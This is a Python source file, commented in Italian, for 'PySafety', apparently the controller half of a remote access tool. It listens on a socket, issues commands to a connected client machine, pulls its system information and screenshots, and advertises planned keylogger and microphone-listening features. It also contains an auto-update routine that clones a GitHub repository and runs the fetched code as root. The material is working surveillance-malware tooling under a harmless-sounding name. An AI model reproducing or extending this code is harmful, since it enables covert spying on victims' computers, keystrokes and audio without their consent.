import socket
import ssl
import os
import time
import pyfiglet
import colorama
from colorama import Fore
import requests

VERSIONE = ['beta', 2]

colorama.init(autoreset=True)

red = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
reset = Fore.RESET

HOST = '127.0.0.1'
PORT = 8080

class UI:
    def __init__(self):
        text = 'PySafety'
        ascii_art = pyfiglet.figlet_format(text)
        print(green + ascii_art)
        print(red + '=' * 45)


class Server:
    def __init__(self):
        os.system('clear')
        UI()

    def main(self):
        # print('Cerco la cartella cert...')
        # if os.path.exists('cert'):
        #     print('Directory ./cert trovata')
        #     print('Avvio...')
        #     time.sleep(0.5)
        #     os.system('clear')
        #     self.server()
        # else:
        #     print('Directory ./cert NON trovata')
        #     print('Leggi il file readme.txt per risolvere')
        self.server()
        

    def server(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((HOST, PORT))
        print('Server creato e configurato')
        self.sock.listen(5)
        # print('Configurazione SSL per comunicazione crittata...')
        # self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # self.context.load_cert_chain(certfile='cert/server.crt.pem', keyfile='cert/server.key.pem')

        # print('La connessione verra` crittata dopo aver stabilito una connessione')
        print('Premi Ctrl+C per uscire')
        print(f'Server in ascolto: {HOST} ~ {str(PORT)}')

        try:
            self.conn, addr = self.sock.accept()
            self.hostname = self.Recv()
            # self.ssl_server = self.context.wrap_socket(self.conn, server_side=True)
            print(f'Connessione sicura da {addr}')                

            self.send_command()
        except KeyboardInterrupt:
            try:
                self.conn.close()
                print(f'Connessione con {self.conn} terminata')
                # self.ssl_server.close()
            except:
                pass
            self.sock.close()
            print('\nServer chiuso')
            # print('\nServer SSL chiuso')


    def send_command(self):
        while True:
            command = input(f'({red + self.hostname + reset})> ')
            self.Send(command)
            match command:
                case 'exit':
                    # self.ssl_server.close()
                    try:
                        self.conn.close()
                        self.sock.close()
                        break
                    except:
                        pass
        
                case 'help':
                    print('\n Le opzioni contrassegnate da * saranno disponibili nelle versioni future')
                    print('\n\tLISTA COMANDI:\n\t' + '=' * 60)
                    print('\thelp          -> Visualizza i comandi')
                    print('\texit          -> Chiudi la connessione ed esci')
                    print('\tversion       -> Visualizza la versione corrente')
                    print('\tcls/clear     -> Pulisci lo schermo')
                    print('\tsysinfo       -> Visualizza le informazioni del pc client')
                    print('\tscreenshot    -> Scatta uno screenshot')
                    print('\tkeylogger *   -> Registra la pressione dei tasti')
                    print('\tlistener  *   -> Ascolta dal microfono del client')
                    print('')

                case 'version':
                    print(f'Versione corrente: {VERSIONE[0]} {VERSIONE[1]}')

                case 'cls' | 'clear':
                    os.system('clear')
                    UI()

                case 'sysinfo':
                    data = self.Recv()
                    print(data)

                case 'screenshot':
                    self.Recv(command)

                case _:
                    print(f'{command} - Comando non valido, riprovare')


    def Send(self, command):
        # command = self.ssl_server.send(b'%s' % command.encode())
        command = self.conn.send(command.encode())
        return command

    def Recv(self, options=''):
        # data = self.ssl_server.recv(4096).decode()
        data = ''
        match options:
            case 'screenshot':
                img_size_data = self.conn.recv(4)
                img_size = int.from_bytes(img_size_data, byteorder='big')
                received_data = b''
                while len(received_data) < img_size:
                    chunck = self.conn.recv(4096)
                    if not chunck:
                        break
                    received_data += chunck
                self.screen_counter = 0
                with open(f'screenshot_{self.screen_counter}.png', 'wb') as file:
                    file.write(received_data)
                
                print(f'Screenshot salvato come screenshot_{self.screen_counter}.png')
                self.screen_counter += 1
 
            case '':
                data = self.conn.recv(4096).decode()
        
        return data
        

def check_update():
    update = False
    url = 'https://raw.githubusercontent.com/Beato029/PySafety/refs/heads/main/versione.json'
    req = requests.get(url).json()
    state = req['state']
    version = req['version']
    if state == 'beta':
        if version > VERSIONE[1]:
            print(f'Nuova beta disponibile: {state} {version} \n(Non si congiglia il download delle beta perche` potrebbero non funzionare come le versioni ufficiali)')
            update = True

    elif VERSIONE[0] == 'beta' and state == 'release':
        print(f'Release disponibile: {state} {version} si consiglia il download')
        update = True

    elif state == 'release':
        if version > VERSIONE[1]:
            print(f'Nuova versione disponibile: {state} {version}')
            update = True

    if update:
        download = input('Scaricare l`aggiornamento [Y/n]? ').lower()
        if download in ['yes', 'y']:
            os.system('sudo git clone https://github.com/Beato029/PySafety.git')
            os.system('sudo mv Pysafety/main.py .')
            os.system('sudo touch start.py')
            command = 'import os\nos.system("sudo python main.py")'
            os.system(f'echo "{command}" > start.py')
            os.system('sudo rm -rf PySafety')
            os.system('sudo python start.py')
            os.system('sudo rm -rf start.py')
        else:
            pass


if __name__ == '__main__':
    check_update()

    if os.getuid() == 0:
        Server().main()
    else:
        print(f'Esegui come root')
